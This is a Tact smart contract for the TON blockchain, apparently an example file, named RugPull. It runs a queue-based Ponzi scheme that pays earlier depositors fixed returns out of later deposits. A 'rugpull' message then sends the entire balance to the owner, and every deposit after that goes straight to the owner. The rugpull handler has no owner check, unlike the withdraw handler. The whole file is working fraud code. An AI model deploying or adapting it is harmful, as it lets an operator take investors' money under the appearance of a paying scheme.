import "@stdlib/ownable";
import "@stdlib/stoppable";

struct RugParams {
    investment: Int;
    returns: Int;
    fee: Int;
}

contract RugPull with OwnableTransferable, Stoppable {

    // Parameters
    owner: Address;
    investment: Int;
    returns: Int;
    fee: Int;
    balance: Int;
    rugpulled: Bool;
    stopped: Bool;

    // Queue
    queueStart: Int;
    queueEnd: Int;
    queue: map<Int, Address>;
    
    init(owner: Address, investment: Int, returns: Int, fee: Int) {
        self.owner = owner;
        self.rugpulled = false;
        self.queueStart = 0;
        self.queueEnd = 0;
        self.balance = 0;
        self.investment = investment;
        self.returns = returns;
        self.fee = fee;
        self.stopped = false;
    }

    receive() {

        // Must not be stopped stop
        self.requireNotStopped();

        // Fowrad everything to owner if rugpulled
        if (self.rugpulled) {
            send(SendParameters{value: 0, to: self.owner, mode: SendRemainingBalance });
            return;
        }

        // Check if value ok
        let ctx: Context = context();
        require(ctx.value >= (self.investment + self.fee), "Invalid value");

        // Add to queue
        self.queue.set(self.queueEnd, ctx.sender);
        self.queueEnd = self.queueEnd + 1;
        self.balance = self.balance + self.investment;

        // Perform payouts
        while((self.balance > self.returns) && (self.queueEnd - self.queueStart > 0)) {
            let investor: Address = self.queue.get(self.queueStart)!!;
            self.balance = self.balance - self.returns;
            self.queueStart = self.queueStart + 1;
            self.sendPayout(investor, self.returns);
        }
    }

    receive("withdraw") {
        self.requireOwner();
        if (!self.rugpulled) {
            nativeReserve(self.balance, 0);
        }
        send(SendParameters{value: 0, to: self.owner, mode: SendRemainingBalance });
    }

    receive("rugpull") {
        self.rugpulled = true;
        send(SendParameters{value: 0, to: self.owner, mode: SendRemainingBalance });
    } 

    fun sendPayout(to: Address, value: Int) {
        send(SendParameters{value: value, to: to, mode: SendIgnoreErrors });
    }

    get fun params(): RugParams {
        return RugParams{investment: self.investment, returns: self.returns, fee: self.fee};
    }
}